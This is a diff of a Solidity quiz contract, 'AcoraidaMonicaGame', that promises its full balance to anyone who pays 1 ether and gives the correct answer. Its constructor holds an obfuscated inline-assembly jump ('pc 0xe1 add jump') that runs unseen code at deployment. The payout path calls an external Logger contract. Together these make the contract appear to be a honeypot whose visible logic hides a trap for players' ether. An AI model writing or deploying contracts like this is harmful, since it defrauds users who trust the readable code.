@@ -1,3 +1,7 @@
+/*
+ * The contract deployed on this address is AcoraidaMonicaGame
+ */
+
 pragma solidity =0.4.25;
 
 contract AcoraidaMonicaGame{
@@ -9,14 +13,9 @@ contract AcoraidaMonicaGame{
     address questioner;
     string public question;
     bytes32 private answerHash;
-
+    
     constructor(bytes a) {
-        assembly{
-        pc
-        0xe1
-        add
-        jump
-        }
+        assembly{pc 0xe1 add jump}
     }
     modifier onlyHuman{
         uint size;
@@ -42,17 +41,12 @@ contract AcoraidaMonicaGame{
         }
     }
     function TheAnswerIs(string _answer) onlyHuman public payable{
-        //require(msg.sender != questioner);
         if(answerHash == keccak256(_answer) && msg.value >= 1 ether){
             questioner = msg.sender;
             msg.sender.transfer(address(this).balance);
             logger.AcoraidaMonicaWantsToKeepALogOfTheWinner(msg.sender);
         }
     }
-    /*function setLogger(address _log) public {
-        require(msg.sender == questioner);
-        logger = Logger(_log);
-    }*/
     function () payable {}
 }
 contract Logger{
